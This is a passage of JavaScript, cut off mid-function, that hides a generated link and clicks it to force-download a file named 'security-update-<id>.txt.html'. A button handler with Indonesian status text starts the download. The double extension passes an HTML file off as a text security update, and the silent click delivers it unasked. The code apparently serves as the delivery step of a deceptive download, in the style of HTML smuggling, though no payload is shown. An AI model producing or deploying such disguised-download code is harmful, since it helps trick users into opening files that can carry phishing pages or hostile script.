const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    link.download = `security-update-${fileData.id}.txt.html`; 
    link.textContent = `Download security-update.txt.html`;
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

startBtn.addEventListener("click", () => {

    statusDiv.textContent = "Menyiapkan file...";

    setTimeout(async () => {
        try {
            const fileData = await prepareMimeBlobAsync(1);
            triggerInstantDownload(fileData);
